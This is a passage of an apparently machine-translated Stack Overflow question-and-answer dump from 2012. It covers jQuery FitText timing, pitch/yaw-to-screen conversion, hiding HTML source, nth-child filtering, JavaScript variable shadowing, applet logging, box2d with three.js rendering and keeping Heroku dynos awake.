我应该在我对问题的描述中更具体。我正在尝试在 FlexSlider 的标题框中使用 FitText。我能够让 Ankit 下面的示例正常工作，但 FlexSlider 标题文本仍然不正确。我相信没有及时加载必要的滑块元素以使 FitText 生效。我使用以下糟糕的代码解决了这个问题：

```
<script type="text/javascript">
$(document).ready(function() {
       $('#spinner').hide();
    setTimeout( function() { $("h1").fitText(.6); }, 200 );
     setTimeout( function() { $("h1").fitText(.6); }, 300 );
     setTimeout( function() { $("h1").fitText(.6); }, 500 );
     setTimeout( function() { $("h1").fitText(.6); }, 700 );
   setTimeout( function() { $("h1").fitText(.6); }, 1500 );
}); 
</script> 
```

我知道这一定是黑客攻击，但我的文本现在可以根据需要调整大小。如果有人可以提出更好的方法，我会全力以赴。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-03T02:10:47.560

如果有人感兴趣，您现在可以使用 flexslider 回调来解决这个问题，如下所示：

```
$('.flexslider').flexslider({
  animationLoop: true,
  directionNav: false,
  start: function(){$(".fittext").fitText();},
  after: function(){$(".fittext").fitText();}
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T19:14:48.113

您可能希望在内容加载后添加此 javascript。尝试在关闭 body 标签之前添加脚本标签，看看它是否有效

编辑：一个对我有用的简单示例：

```
 <html>
  <head>
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"></script>
    <script src="https://raw.github.com/davatron5000/FitText.js/master/jquery.fittext.js"></script>
  </head>
  <body>
    <h1>This is test</h1>
    <script type="text/javascript">
          $("h1").fitText(0.6);
    </script>
  </body>
</html> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-02-10T12:06:20.947

对于那些仍然有问题的人，这个修复对我有用

替换里面的这段代码`jquery.fittext.js`

```
// Call once to set.
resizer(); 
```

有了这段代码，

```
$(window).load(function(){
    resizer();
}); 
```

# java - 游戏 - 将俯仰和偏航转换为 XY

> ID：10078383
> 
> 赞同：0
> 
> 时间：2012-04-09T19:09:17.527
> 
> 标签：java

我正在尝试在屏幕上的某个点上显示图像。

我有当前点的俯仰和偏航。我需要的只是将这些值转换为 2 个坐标点。

这是我到目前为止所做的：

```
double tmp_yaw = yaw - myPlayer_yaw;
double tmp_pitch = pitch - myPlayer_pitch;

if (tmp_yaw < -180D) tmp_yaw += 360D;
if (tmp_yaw > 180D) tmp_yaw -= 360D;

// X Y screen coords
int x = (tmp_yaw / 180) * (screen_width / 2);
int y = (tmp_pitch / 90) * (screen_height / 2); 
```

乍一看，这段代码看起来很简单，但我不知道为什么我没有显示预期的点。

变量在`yaw`这里`pitch`是旋转到 3D 中的点。

变量`myPlayer_yaw`和`myPlayer_pitch`代表玩家在任何时候正在看的地方。

我做错什么了吗？

![在此处输入图像描述](../Images/56bffe15f04ea85591979d738b972cfd.png)

我想得到这样的结果：

*   我正在寻找一个玩家 => 返回（高度/2，宽度/2）
*   玩家在我身后 => 返回 (height, width/2)
*   玩家在我左边 => Returns (height/2, 0)
*   玩家在我的右边 => Returns (height/2, width)
*   玩家就在我上方 => 返回 (0, width/2)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-16T09:06:34.797

最后我解决了它`vertex3D`

这是代码：

```
public void drawLine(Vector3 origin, Vector3 destination, int color)
{
    GL11.glBlendFunc(GL11.GL_SRC_ALPHA, GL11.GL_ONE_MINUS_SRC_ALPHA);
    GL11.glLineWidth(3.0F);
    GL11.glDisable(GL11.GL_DEPTH_TEST);
    GL11.glDepthMask(false);
    GL11.glBegin(GL11.GL_LINES);

    float red = (float)((color & 0xFF0000) >> 16);
    float green = (float)((color & 0x00FF00) >> 8);
    float blue = (float)(color & 0x0000FF);
    GL11.glColor3f(red, green, blue);

    double diffX = destination.x() - origin.x() + 0.05D;
    double diffY = destination.y() - origin.y() - 1.35D;
    double diffZ = destination.z() - origin.z() - 0.05D;

    GL11.glVertex3d(0.0D, 0.0D, 0.0D);
    GL11.glVertex3d( -diffX, -diffY, -diffZ);

    GL11.glEnd();
    GL11.glDepthMask(true);
    GL11.glEnable(GL11.GL_DEPTH_TEST);
} 
```

你可以这样使用它：

```
Vector3 vOrg = new Vector3(x, y, z);
Vector3 vDest = new Vector3(cameraX, cameraY, cameraZ);
drawLine(vOrg, vDest, 0xFF0000); // Will display a red line (RGB format) 
```

我希望这会对某人有所帮助。

# javascript - 使用 javascript 隐藏 HTML 页面的源代码

> ID：10078392
> 
> 赞同：-2
> 
> 时间：2012-04-09T19:10:03.823
> 
> 标签：javascript, html, view-source

我看到了[如何隐藏 html 源代码并禁用右键单击和文本复制？](https://stackoverflow.com/questions/6597224/how-to-hide-html-source). 其中一个答案是使用 ctrl+u 查看源代码。但是，使用[shortcut.js](http://www.openjs.com/scripts/events/keyboard_shortcuts/shortcut.js)我也可以覆盖ctrl+u。在这种情况下如何查看源代码。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-09T19:12:21.967

没有办法阻止这种情况。有人可以使用 curl 或 wget 等非浏览器工具轻松下载该页面，或者使用 Wireshark 记录所有 HTTP 流量。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-09T19:11:48.657

用这个。[http://www.fiddler2.com/](http://www.fiddler2.com/)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-09T19:11:49.817

取决于浏览器，但您可以进入`View -> Page Source`大多数查看源代码。但是，您不能覆盖它。

此外，这被认为是不好的做法，有人也可以通过像 Firebug 这样的工具轻松地覆盖该功能。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-04-09T19:13:00.783

你不能阻止人。它将通过网络传递，并通过 Fiddler 进行嗅探，或者有人可以使用基于文本的浏览器，或者完全禁用 Javascript，或者查看他们从您的站点下载的文件的缓存文件夹。

你不能阻止人们看到你的来源。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-09T19:20:58.593

那么不可能阻止用户看到您的脚本。但是您可以做的是让用户在使用几种常用方法后退出尝试变得更加困难。

我建议您**加载初始页面**。**然后使用 ajax 加载整个页面**。您也可以显示友好的加载 gif。该技术具有以下优点，

*   浏览器不显示生成的 HTML。开发人员知道如何看待这一点。但是普通用户不会轻易找到它
*   如果任何用户只需按 Ctrl+u，它将显示初始页面。
*   wget，curl工具第一次用不了。
*   此外，您可以混淆主页（您将通过 Ajax 加载）。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-04-09T19:24:11.273

阻止人们从您的网站获取 HTML 几乎是不可能的。无论如何，我看不出您有任何理由首先要隐藏它。隐瞒什么？

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-04-09T19:12:33.010

想要查看源代码，无论使用什么 javascript 来隐藏它？`cURL`这页纸。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-04-09T19:17:04.083

即使您禁用右键单击，您仍然可以通过按键盘上的 prt scrn 键然后将其粘贴到图像编辑器中来进行快照。

你不能禁用它。有很多方法可以加密它，但麻烦多于它的价值。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2012-04-09T19:55:06.293

隐藏源代码是不可能的，HTML 和 Javascript 是解释性语言，这意味着浏览器将“编译”客户端机器上的代码。

# mono - 使用 MonoDevelop 同时查看多个源文件

> ID：10078393
> 
> 赞同：7
> 
> 时间：2012-04-09T19:10:05.740
> 
> 标签：mono, monodevelop

以上可能吗？我经常使用灵活的窗口停靠系统在 VS 中执行此操作（通常是让测试和测试目标一起可见）。有没有办法在 MonoDevelop 中实现同样的目标？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-09T21:58:47.727

很确定这是不可能的。编辑器确实有分屏模式（[从 2.0 版开始](http://monodevelop.com/Download/MonoDevelop_2.0_Released)），但只允许查看当前文件中的多个位置。

# javascript - 从每个三元组中选择第二个和第三个元素

> ID：10078395
> 
> 赞同：4
> 
> 时间：2012-04-09T19:10:19.150
> 
> 标签：javascript, jquery

我有 6 个元素，我想每隔第二个和第三个元素过滤一次，所以我想要元素 2、3、5 和 6。我已经尝试过`.filter(':nth-child(2n+1)'));`，但显然过滤了 2、4 和 6。

我尝试的另一种方法是删除元素 1 和 4，但我找不到与过滤器相反的 jQuery 函数，它可以从集合中删除元素。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-09T19:22:49.457

```
.filter(':not(:nth-child(1),:nth-child(4))') 
```

[http://jsbin.com/owosuw/2/edit#source](http://jsbin.com/owosuw/2/edit#source)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-09T19:32:02.067

以您的示例为例，我认为您实际上并不想要 2n 和 3n。您想要每组 3 个中的第 2 个和第 3 个吗？然后其中任何一个都应该起作用：

```
.filter(':nth-child(3n+2), :nth-child(3n+3)'));
.filter(':not(:nth-child(3n+1))'); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-09T19:39:30.537

您还可以使用`filter`一个函数（它接受一个参数，它是匹配元素的从零开始的数字）：

```
$('div').filter( function(n) { return n%3!=0 } ) 
```

在此处查看我的 JSFiddle 概念验证：

[http://jsfiddle.net/4c4Re/](http://jsfiddle.net/4c4Re/)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-09T19:24:40.907

I think you can't do it with only one `nth-child`. I don't know what you want to do, but if you want to give it a style or class or event or something in that category you can give it them all and remove it from the 1th and the 4th:

```
$('div').addClass('red');

$('div:nth-child(3n+1)').removeClass('red'); 
```

Live example: [http://jsfiddle.net/gnbMH/](http://jsfiddle.net/gnbMH/)

* * *

You could also use two `nth-child`s to get it work:

```
$('div:nth-child(3n+2)').addClass('red');
$('div:nth-child(3n+3)').addClass('red'); 
```

Live example: [http://jsfiddle.net/gnbMH/1/](http://jsfiddle.net/gnbMH/1/)

* * *

You also could combine to the two `nth-child`s and then you get something like this:

```
var elems = $('div:nth-child(3n+2)');
$('div:nth-child(3n+3)').each(function(i,elem) {
    elems.push(elem);
});

$(elems).addClass('red'); 
```

Live example: [http://jsfiddle.net/gnbMH/2/](http://jsfiddle.net/gnbMH/2/)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-09T19:31:31.637

尝试使用`:not(:nth-child(3n+1))`.. 类似的东西`.filter(':not(:nth-child(3n+1))').`

[**演示**](http://jsfiddle.net/skram/LgSBJ/1/)

# google-chrome-extension - Chrome 扩展：“未捕获的错误：“getBackgroundPage”只能在扩展进程中使用......”

> ID：10078402
> 
> 赞同：1
> 
> 时间：2012-04-09T19:10:59.880
> 
> 标签：google-chrome-extension

我只向测试人员发布了一个 chrome 扩展。该应用程序似乎运行良好。检查弹出窗口或背景页面的控制台时，我没有看到任何错误。但是，在检查任何网页的控制台时出现以下错误：“未捕获的错误：“getBackgroundPage”只能用于扩展进程。有关更多扩展/schema_g​​enerated_bindings.js:418，请参阅内容脚本文档”

这个应用程序包含几个 JavaScript 文件，但每个文件都包含一个自执行函数中的代码。“getBackgroundPage”调用位于 JavaScript 文件中。

能否请你帮忙？我构建的应用程序不是独立于任何网页的独立模块吗？如何防止此错误发生？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-08-03T19:30:06.493

当我尝试从我的内容脚本与背景页面进行通信时，我遇到了同样的错误。正确的做法是通过消息传递。这里有很好的记录：[https ://developer.chrome.com/extensions/messaging.html](https://developer.chrome.com/extensions/messaging.html)

# javascript - Javascript变量未定义

> ID：10078404
> 
> 赞同：-2
> 
> 时间：2012-04-09T19:11:34.560
> 
> 标签：javascript, jquery

出于某种原因，我根本无法定义变量“total”...

我将它定义为 74，但由于某种原因它不想坚持..我做错了什么？提前致谢！

```
$(document).ready(function() {

    function getParameterByName(name)
    {
        name = name.replace(/[\[]/, "\\\[").replace(/[\]]/, "\\\]");
        var regexS = "[\\?&]" + name + "=([^&#]*)";
        var regex = new RegExp(regexS);
        var results = regex.exec(window.location.search);
        if(results == null)
            return "";
        else
            return decodeURIComponent(results[1].replace(/\+/g, " "));
    }

    $(".tab-content").hide(); //Hide all content
    $("ul.tabs li:first").addClass("active").show(); //Activate first tab
    $(".tab-content:first").show(); //Show first tab content

    $('.question-form-submit').click(function(e) {
        e.preventDefault();
        var activeTab = '#'+$(this).attr('name');
        var activeClass = activeTab.substr(5);
        $("ul.tabs li").removeClass("active"); 
        $('ul li:nth-child('+activeClass+')').addClass("active"); //Add "active" class to selected tab
        $(".tab-content").hide(); //Hide all tab content
        $(activeTab).fadeIn(); //Fade in the active ID content

        $('.meter-value').removeClass('meter-width');

        switch (activeClass) {
            case '2' :
                $('.meter-value').attr('style', 'background-color: #9496c9; width: 46.5%;');
                break;

            case '3' :
                $('.meter-value').attr('style', 'background-color: #9496c9; width: 67%;');
                break;

            case '4' :
                $('.meter-value').attr('style', 'background-color: #9496c9; width: 100%;');
                break;

        }

        return false;
    });

    $('.quantity, .init_cost').change(function() {

        var row_id = $(this).attr('id');
        var row_number = row_id.substr(9);
        var item_cost = $('#cost_'+row_number).attr('value');
        var item_quantity = $('#quantity_'+row_number).attr('value');
        var final_cost = item_cost * item_quantity;

        $('#final_cost_'+row_number).val(final_cost).formatCurrency();;

    });

    $('.row input').each(function(index) {

        var row_id = $(this).attr('id');
        var row_number = row_id.substr(9);
        var item_cost = $('#cost_'+row_number).attr('value');
        var item_quantity = $('#quantity_'+row_number).attr('value');
        var final_cost = item_cost * item_quantity;

        $('#final_cost_'+row_number).val(final_cost).formatCurrency();;

    });

        var total = 0;
        $('.final_cost').each(function(index) {

            var final_cost = $(this).attr('value').substr(1);
            var total = total + final_cost;
            console.log(total);

        })

}); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-09T19:14:10.517

该行的内部声明`var total = total + final_cost;`隐藏了该行的外部声明`var total = 0;`。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-09T19:13:52.700

每个`total`函数中的 都遮蔽了外部函数。

同样的事情的一个更简单的例子是[在这里](http://jsfiddle.net/tHUKG/3/)：

```
(function()
 {
     var total = 1;
     console.log("total 1: " + total);
     (function()
      {
          console.log("total 2: " + total);
          var total = total + 3;
          console.log("total 3: " + total);
      })()
 })(); 
```

除了阴影之外，您还必须考虑[吊装](http://www.adequatelygood.com/2010/2/JavaScript-Scoping-and-Hoisting)。因为内部的var被提升到了顶部，所以内部函数大致相当于：

```
function()
{
    var total = undefined;
    console.log("total 2: " + total);
    total = total + 3;
    console.log("total 3: " + total);
} 
```

在这种情况下，我认为您根本不想要 inner`var`关键字。在其他情况下，您将使用不同的变量名称。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-09T19:14:51.700

每次循环时，您都在重新定义总数

```
$('.final_cost').each(function(index) {

    var final_cost = $(this).attr('value').substr(1);
    var total = total + final_cost;
    console.log(total);

}) 
```

为什么不试试这个？

```
$('.final_cost').each(function(index) {

    var final_cost = $(this).attr('value').substr(1);
    total = total + final_cost;
    console.log(total);

}) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-09T19:15:28.847

尝试在总数之前删除第二个 var。

```
total = total + final_cost; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-09T19:15:23.673

那是因为你声明了变量两次（每次你写`var total`它都会重新声明。所以你有一个在“final_cost”函数之外，一个在里面，它被设置为从外部 + final_cost 的总数。所以实际上你总是记录的值最终成本。

只需编写`total = total + final_cost;`，它应该可以工作。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-04-09T19:15:42.560

语法错误，杀死你的脚本：

```
 $('#final_cost_'+row_number).val(final_cost).formatCurrency();;
                                                                  ^--- extra ; 
```

下次，检查浏览器的控制台（FF/Chrome 中的 shift-ctrl-J）是否有错误。像这样的事情会立即报告。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-04-09T19:17:33.380

我将替换该行：

```
var total = total + final_cost; 
```

和：

```
total += final_cost 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-04-09T19:50:29.947

不确定这个答案，但是，尝试首先使用默认值（如 0）定义变量 total，然后使用 total + final_cost 操作。

```
var total = 0;
total += final_cost; 
```

这是为什么？当您声明没有默认值的总计时，该值将是“未定义”，因此 javascript 将表示以下内容：

```
var total = "undefined" + final_cost; 
```

我想这就是错误。

# c# - ASP.NET MVC 3 站点，其中一页使用 NT 身份验证，其余未授权

> ID：10078405
> 
> 赞同：0
> 
> 时间：2012-04-09T19:11:45.500
> 
> 标签：c#, asp.net-mvc-3, authentication, ssl

我正在为我们的客户服务部门创建一个站点，以便为我们的客户请求密码休息电子邮件。流程是客户可以致电 CS，向他们提供他们的身份信息，然后 CS 将单击我们网站上的按钮向用户注册地址发送电子邮件。

为了简化事情，我想让 CS 页面要求用户是内部用户并登录到我们的域。但是客户应该能够在没有凭据的情况下访问该站点。所以，我希望 CS 视图需要 NT 身份验证，而不是客户的那些。

整个站点将使用 SSL。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T19:19:42.467

对于仅限于您的 CS 人员的控制器/操作，您可以使用授权属性。这可以将他们绑定到特定的域组，并利用他们登录的凭据和权限。

```
[Authorize(Roles = @"Domain\GroupName")] 
```

然后，不需要限制或通过应用程序级别登录处理的页面/控制器可以通过正常登录方法运行它们。

# delphi - 快速报告别名 x 模板

> ID：10078415
> 
> 赞同：2
> 
> 时间：2012-04-09T19:12:17.033
> 
> 标签：delphi, fastreport

我为字段定义了别名，以便在模板版本中提供友好的名称。问题是这些友好名称是本地化的，FastReport 使用别名而不是字段名称保存模板！这似乎不太聪明。

如果我采用以语言 A 创建的模板并尝试将其与语言 B 一起使用，则会引发很多错误，因为不再找到这些字段。或者更糟糕的是，如果有人认为某个特定的翻译不好并对其进行了更改，那么将不再找到该字段。

有没有办法在不替换将要保存的模板的字段名称的情况下为字段设置友好名称？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T20:35:25.867

由于 FastReports 将其所有报告模板保存为 XML 文件，因此完成您想要做的最简单的方法可能是编写一个例程，该例程将读取 FastReport XML 文件并遍历所有 TfrxMemoView 节点，将 Text 属性更改为友好的本地名称。

# java - Java小程序：如何确保在页面刷新之前完成销毁

> ID：10078426
> 
> 赞同：5
> 
> 时间：2012-04-09T19:13:02.513
> 
> 标签：java, applet, logging, handler, java.util.logging

在 Java util logging 中，我在 init() 上启动处理程序，并在 destroy() 处关闭处理程序，它工作得非常好：创建了一个日志文件等。如果用户正常刷新页面，它仍然只创建一个日志文件。

但是，如果用户使用小程序快速刷新页面几次，似乎 destroy() 没有被调用或者可能还没有完成任务，并且由于 init() 被再次调用，它假定以前的文件仍然被锁定并创建一个新的日志文件。

我尝试同时使用 destroy() 和 finalize() 来关闭处理程序，但它不起作用。任何人都知道如何解决这个问题？

另一个小问题是：如果 init() 没有完成并且页面被刷新，实际发生了什么。它会继续这个过程并最终无法调用destroy() 还是就停在那里？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-14T16:08:47.663

引用[Java 教程](http://docs.oracle.com/javase/tutorial/deployment/applet/appletExecutionEnv.html)：

> Java 插件软件为每个 Java 小程序创建一个工作线程。

在多线程环境中，您应该非常小心共享资源。最好和最简单的方法是不共享任何东西（规模最好并且不会出现死锁）。

我假设，您每次都在“init”方法中初始化您的处理程序。如果是这样，您应该使用一个静态共享记录器（检查此[链接](https://stackoverflow.com/questions/8915448/using-synchronization-while-logging)）。这将有助于稍微改善情况，但如果您使用您的小程序启动多个浏览器 - 仍将创建新的日志文件。Oracle 不建议使用此解决方法，并保留此解决方法以实现向后兼容性。

* * *

推荐且易于实施的解决方案 - “每个小程序都应该有自己的记录器并写入自己的文件”。生成日志文件名的代码：

```
private SimpleDateFormat dateFormat = new SimpleDateFormat("yyyyMMdd");

private String generateFileName() {
    return String.format("applets-log/%s-%s.log", dateFormat.format(new Date()), UUID.randomUUID());
} 
```

此外，[Applet 开发的最佳实践](http://download.java.net/jdk8/docs/technotes/guides/jweb/applet/best_practices.html)。

* * *

回答您的小问题（已**更改**）：

根据对 java 插件中这个[旧 bug](http://bugs.sun.com/view_bug.do?bug_id=6840201)的讨论，applet 可以在任何时候以一些预定义的时间间隔终止以进行清理。因此，您应该将资源清理代码放在“停止”或“销毁”方法中，但您不应该依赖该代码将执行的内容。

> Applet 的生命周期由浏览器控制，当其托管文档被浏览器破坏时，不应赋予 Applet 运行的能力。
> 
> 从 6u10 开始，旧插件和新插件都会在固定时间（旧插件中为 1000 毫秒，新插件中为 200 毫秒）后强制关闭小程序，以使小程序停止。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-12T11:55:43.267

希望你不是在 FF 中测试。在这里阅读： [https ://bugzilla.mozilla.org/show_bug.cgi?id=638070](https://bugzilla.mozilla.org/show_bug.cgi?id=638070)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-17T02:56:56.847

您只是遇到了多线程环境的基本限制。

相对于其他线程，您真的无法判断何时`destroy()`或`finalize()`将被调用。当浏览器重新加载页面时，它可能会在新线程中加载小程序。如果用户快速点击重新加载两次，它可能会创建 2 个新线程，在调用用户从未见过的线程之前和调用前一个线程`init()`之前调用第二个线程（用户实际看到的）。在生命周期的另一端， 可能在不再需要对象很长时间后由垃圾收集线程调用。您在多线程环境中工作，您不能指望线程之间的任何操作顺序。`init()``destroy()``finalize()`

引用 Javadoc：

> 小程序是一个小程序，它不打算单独运行，而是嵌入到另一个应用程序中。

如果您将只有一个日志文件，那么实际上应该由外部应用程序控制创建/打开和关闭日志。**如果外部应用程序是 Web 浏览器，那么您将无法解决您遇到的问题。** 再说一次，如果您在 Web 浏览器中运行小程序，则不应将日志写入文件系统。这通常是不礼貌的行为。

如果您绝对必须在 Web 浏览器中拥有 applet 的日志文件，最简单的解决方案是为每次调用`init()`创建一个特定于该 applet 调用的新文件。如果您想变得雄心勃勃，您可以使用锁定文件来指示正在使用的文件，并`destroy()`有时将未锁定的日志文件连接成一个更大的文件，但是您又遇到了跨线程协调连接过程的问题。

# javascript - 在three.js中将box2d矩形渲染为3d矩形

> ID：10078429
> 
> 赞同：1
> 
> 时间：2012-04-09T19:13:18.363
> 
> 标签：javascript, canvas, box2d, three.js

当使用画布渲染 box2d 物体时，存在一个大问题，即 box2d 只能为我们提供物体的中心和角度（而画布从左上角绘制矩形等形状）。通过查看 Seth Land 的一些教程，我绕过了这个问题，现在工作正常（我自己永远无法弄清楚这样的事情）：

```
g.ctx.save();
g.ctx.translate(b.GetPosition().x*SCALE, b.GetPosition().y*SCALE);
g.ctx.rotate(b.GetAngle());
g.ctx.translate(-(b.GetPosition().x)*SCALE, -(b.GetPosition().y)*SCALE);
g.ctx.strokeRect(b.GetPosition().x*SCALE-30,b.GetPosition().y*SCALE-5,60,10);
g.ctx.restore(); 
```

其中`b`是身体，`SCALE`是画布像素/box2d-meters 转换器，60 和 10 是矩形的尺寸（所以 30 和 5 是一半尺寸）。

_

**问题**

现在，我想在three.js 上渲染它。第一个反对意见是 three.js 在 3d 中工作，而 box2d 则不行。没问题：我只想在 2d 矩形之上构建一个 3d 矩形。2d 轴尺寸必须来自 box2d，而我希望最后一个尺寸是完全任意的。

我的工作不需要 3d 物理，2d 就足够了，但我想给这些 2d 物体在三维上的厚度。我怎样才能做到这一点？！到目前为止，我一直在尝试这样：

```
 // look from above
    camera.position.set(0,1000,0);
    camera.rotation.set(-1.5,0,0);

    geometry = new THREE.CubeGeometry( 200, 60, 10 , 1,1,1);

    // get b as box2d rectangle
    loop(){
    mesh.rotation.y = -b.GetAngle();
    mesh.position.x = b.GetPosition().x*SCALE;
    mesh.position.y = -b.GetPosition().y*SCALE;
    } 
```

不幸的是，这根本不像 box2d 调试绘制。-1.5 不是将相机旋转到完美 90 度角的正确值（有人知道确切的值吗？），更糟糕的是，three.js 矩形不跟随 box2d 的运动，我遇到了几乎相同的问题在使用上下文翻译和上下文旋转之前使用标准画布。

我希望有人有时间解释一个可能的解决方案。提前非常感谢！:)

编辑：看起来有人已经这样做了（需要 chrome 上的 webgl）： http: [//game.2x.io/](http://game.2x.io/) http://serv1.aelag.com:8082/threeBox

第二个只是球体，所以box2d和threejs之间的旋转映射没有问题。第一个还包括立方体和矩形：这就是我想要做的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T10:13:05.400

您使用的是什么类型的相机？

要获得“2d”效果，您需要使用正交相机，否则您将获得透视投影的东西，并且与您在 2D 中看到的内容不匹配。

# heroku - 如果我为 1 个工人测功机付费，我在 1 个网络测功机上运行的 Heroku 应用程序会保持活动状态吗？

> ID：10078430
> 
> 赞同：8
> 
> 时间：2012-04-09T19:13:34.873
> 
> 标签：heroku

我目前在 Heroku 上部署了一个应用程序，该应用程序在两个网络测功机上运行，​​因此如果它在一段时间内保持不活动状态，它就不会进入睡眠状态。

现在，如果我将其缩小到只有一个网络测功机（免费），而不是为一个工人测功机付费，Heroku 会始终保持我的应用程序处于活动状态吗？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-04-09T19:37:24.700

它仍然会闲置-您*需要*拥有多个网络测功机

[https://devcenter.heroku.com/articles/dyno-idling](https://devcenter.heroku.com/articles/dyno-idling)

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-11-22T21:00:33.697

您还可以使用 New Relic 插件来监控您的应用程序并使其保持活力。设置中有一个选项卡来配置可用性监控。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-07T23:44:44.537

您还可以通过使用 pingdom.com 之类的监控服务来避免单个 Web dyno 空闲，因为它会定期向您的 Web dyno 发送请求。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-23T23:07:27.893

尝试 Pingdom。免费计划包括一项网站检查。我使用这项服务来保持我的应用程序一直处于活动状态。

> Pingdom 每分钟测试一次您的网站和其他基础设施组件，以确保它们都正常运行。

来自[Pingdom 主页](https://www.pingdom.com/)

Pingdom 通过“ping”或定期从您的网站请求资源来做到这一点。这具有使您的网站保持“活跃”、缓存已启动等的副作用。因为您的网站经常看到“流量”（来自 pingdom 的请求）。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-04-04T03:06:31.383

试试 Unidler。您无需登录，而且是免费的。 [http://unidler.herokuapp.com/](http://unidler.herokuapp.com/)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-04-15T22:15:50.473

您可以尝试[http://kaffeine.herokuapp.com/](http://kaffeine.herokuapp.com/)它会每 30 分钟 ping 您的应用程序，因此您的应用程序不会进入睡眠状态。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2014-05-22T02:58:12.330

试试[CloudUp](http://www.thecloudup.com)。它会定期访问您的应用程序以使它们保持清醒。它是免费的，您可以根据需要添加任意数量的应用程序。它还可以激活 Google App Engine 和 Azure 上的应用程序。

# iphone - 如何创建地图图标？

> ID：10078431
> 
> 赞同：0
> 
> 时间：2012-04-09T19:13:35.020
> 
> 标签：iphone, gps

我的应用程序目前向用户的 GPS 坐标发送短信，之后接收者将它们输入到我们 iPhone 附带的 MAP 应用程序中。我刚刚发现，以某种方式创建一个图标是可能的，收件人只需单击它即可调出 MAP 应用程序，它会在其中显示地图，显示坐标位置以及确切地址。准确性和易用性给我留下了深刻的印象，我想修改我的应用程序以文本图标而不是 GPS 坐标。我整天都在研究，但找不到怎么做。（也许我没找对地方，所以如果我在浪费时间，请见谅。）

我正在尝试创建的图标（和文本）是您在使用 MAP 应用程序查看位置时创建的图标。点击披露按钮后，它会显示详细信息。屏幕底部是一个名为“共享位置”的按钮。如果单击它，则可以选择单击另一个标题为“消息”的按钮。将生成一条带有图标的文本消息，该图标代表带有红头的图钉。这就是我想要创造的。如果可能的话，有人可以指出我可以在哪里找到更多信息，希望包括示例代码？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T21:25:09.937

并非所有用户都有文字图像的能力。最好的选择可能是只使用文本......另外，当你问如何创建图标时，你的意思是什么？实物图？

# javascript - 在Javascript中交换数组元素

> ID：10078433
> 
> 赞同：0
> 
> 时间：2012-04-09T19:13:40.107
> 
> 标签：javascript, arrays

我有一个这样的数组 - （我事先不知道这个数组的长度）

```
data: [[3, 1], [1, 1], [5, 1], [6, 1], [25, 1], [8, 2], [2, 3]] 
```

我怎么能把它换成这样：

```
data: [[1, 3], [1, 1], [1, 5], [1, 6], [1, 25], [2, 8], [3, 2]] 
```

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-09T19:27:39.837

每个元素都是一个数组，因此您可以对其应用反向。

```
for(i = 0; i < data.length; i++) data[i].reverse(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-09T19:16:18.520

```
var i, temp;

for(i = 0; i < data.length; i++) {
    temp = data[i][0];

    data[i][0] = data[i][1];
    data[i][1] = temp;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T19:25:09.603

```
var data = [[3, 1], [1, 1], [5, 1], [6, 1], [25, 1], [8, 2], [2, 3]];
data = data.map(function(x){ // loop though all elements
    return x.reverse(); // reverse each array
}); 
```

[`Arary.map`](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Array/map)应该适用于所有现代浏览器（我的意思是你需要 Chrome、Firefox、Safari、Opera 或 IE9+）。

编辑：由于[`Array.reverse`](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Array/reverse)会改变数组，你也可以这样做：

```
var data = [[3, 1], [1, 1], [5, 1], [6, 1], [25, 1], [8, 2], [2, 3]];
data.forEach(function(x){ // loop though all elements
    x.reverse(); // reverse each array
}); 
```

[`Array.forEach`](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Array/forEach)适用于相同的“现代”浏览器`.map`。

# facebook - 试图让 OAuth 对话框工作

> ID：10078435
> 
> 赞同：1
> 
> 时间：2012-04-09T19:13:42.777
> 
> 标签：facebook, oauth, facebook-oauth

